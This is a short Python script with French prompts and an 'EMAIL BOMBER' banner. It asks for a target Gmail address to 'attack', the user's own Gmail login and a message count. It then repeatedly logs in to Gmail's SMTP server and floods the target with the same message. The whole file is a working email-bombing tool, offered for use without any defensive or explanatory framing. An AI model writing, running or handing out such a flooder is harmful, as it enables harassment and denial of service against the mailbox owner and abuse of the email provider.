import smtplib
import time

print ("           ________    __        __        ____        ________    __                                             ")
print ("          |########|  |##\      /##|      /####\      |########|  |##|              By Sow                        ")
print ("          |##|____    |###\ __ /###|     /##/\##\        |##|     |##|                                            ")
print ("          |########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     ")
print ("          |##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    ")
print ("          |########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    ")
print ("                                                                                                                  ")

try:
    bomb_email = input("Entrer le gmail à attaquer:")
    email = input("Entrez votre adresse-gmail:")
    password = input("Entrez votre mot de passe:")
    message = input("Ecrivez le Message à envoyer:")
    counter = int(input("Combien de mail à envoyer ?:"))

    for x in range(0,counter):
        print("Nombre de mail envoyer : ", x+1)
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)
    mail.close()
except Exception as e:
    print("Une erreur c'est produite")